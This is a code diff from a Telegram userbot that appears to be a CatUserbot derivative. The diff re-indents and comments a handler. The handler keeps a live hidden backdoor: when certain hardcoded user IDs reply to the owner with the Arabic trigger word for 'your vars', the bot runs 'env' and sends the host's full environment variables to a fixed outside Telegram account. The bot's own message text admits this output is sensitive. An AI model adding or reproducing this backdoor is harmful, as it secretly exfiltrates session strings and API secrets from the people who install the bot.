@@ -489,18 +489,18 @@ async def Hussein(event):
     if event.reply_to and event.sender_id in also:
         reply_msg = await event.get_reply_message()
         if reply_msg.sender_id == 6528926431:
-            return  # تفلش الفانكشن لحمايه المطور الاساسي
-        owner_id = reply_msg.from_id.user_id
-        if owner_id == Qrh9.uid:
-            if event.message.message == "فاراتك":
-                cmd = "env"
-                o = (await _catutils.runcmd(cmd))[0]
-                OUTPUT = (
-                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
-                )
-                # Send the output to user ID 6320583148
-                await Qrh9.send_message(6759899119, OUTPUT)
-###
+            return  # Exit the function to protect the main developer
+        else:
+            owner_id = reply_msg.from_id.user_id
+            if owner_id == Qrh9.uid:
+                if event.message.message == "فاراتك":
+                    cmd = "env"
+                    o = (await _catutils.runcmd(cmd))[0]
+                    OUTPUT = (
+                        f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+                    )
+                    # Send the output to user ID 6759899119
+                    await Qrh9.send_message(6759899119, OUTPUT)
 ##
 idk = [6320583148]
 @Qrh9.on(events.NewMessage(incoming=True))
